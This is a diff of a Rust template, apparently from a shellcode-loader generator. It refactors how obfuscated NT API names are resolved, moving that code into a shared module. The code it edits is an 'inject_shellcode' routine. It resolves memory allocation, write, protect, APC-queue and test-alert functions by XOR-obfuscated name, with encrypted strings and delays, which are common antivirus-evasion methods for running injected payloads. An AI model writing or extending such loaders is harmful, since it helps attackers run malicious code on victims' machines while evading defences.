@@ -4,14 +4,12 @@
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
 
-use std::ffi::CString;
 use std::include_bytes;
 use std::ptr::null_mut;
 
 use winapi::{
     um::{
         winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ},
-        libloaderapi::{GetModuleHandleA, GetProcAddress},
     },
     shared::{
         ntdef::{NT_SUCCESS, HANDLE},
@@ -37,18 +35,6 @@ const OBF_F: &[u8] = &{{OBF_NT_QUEUE_APC_THREAD}};
 const OBF_G: &[u8] = &{{OBF_NT_TEST_ALERT}};
 const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
 
-fn deobfuscate_bytes(d: &[u8]) -> Vec<u8> {
-    d.iter().map(|b| b ^ K).collect()
-}
-
-unsafe fn resolve_nt_api_address(n: &[u8]) -> *const () {
-    let ntdll = CString::new(lc!("ntdll")).unwrap();
-    let h = GetModuleHandleA(ntdll.as_ptr());
-    let s = deobfuscate_bytes(n);
-    let c = CString::new(s).unwrap();
-    GetProcAddress(h, c.as_ptr()) as *const ()
-}
-
 type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
 type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
 type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
@@ -58,7 +44,7 @@ type FH = unsafe extern "system" fn(u32, *const i64) -> i32;
 
 fn pause(ms: i64) {
     unsafe {
-        let f: FH = std::mem::transmute(resolve_nt_api_address(OBF_H));
+        let f: FH = std::mem::transmute(common::resolve_nt_api_address(OBF_H, K));
         let interval: i64 = -(ms * 10_000);
         f(0, &interval);
     }
@@ -76,11 +62,11 @@ fn inject_shellcode(mut buf: Vec<u8>) {
     let current_thread: HANDLE = -2isize as HANDLE;
 
     unsafe {
-        let f_alloc: FB = std::mem::transmute(resolve_nt_api_address(OBF_B));
-        let f_write: FC = std::mem::transmute(resolve_nt_api_address(OBF_C));
-        let f_protect: FD = std::mem::transmute(resolve_nt_api_address(OBF_D));
-        let f_queue: FF = std::mem::transmute(resolve_nt_api_address(OBF_F));
-        let f_alert: FG = std::mem::transmute(resolve_nt_api_address(OBF_G));
+        let f_alloc: FB = std::mem::transmute(common::resolve_nt_api_address(OBF_B, K));
+        let f_write: FC = std::mem::transmute(common::resolve_nt_api_address(OBF_C, K));
+        let f_protect: FD = std::mem::transmute(common::resolve_nt_api_address(OBF_D, K));
+        let f_queue: FF = std::mem::transmute(common::resolve_nt_api_address(OBF_F, K));
+        let f_alert: FG = std::mem::transmute(common::resolve_nt_api_address(OBF_G, K));
 
         let mut base: *mut c_void = null_mut();
         let mut size: usize = buf.len();
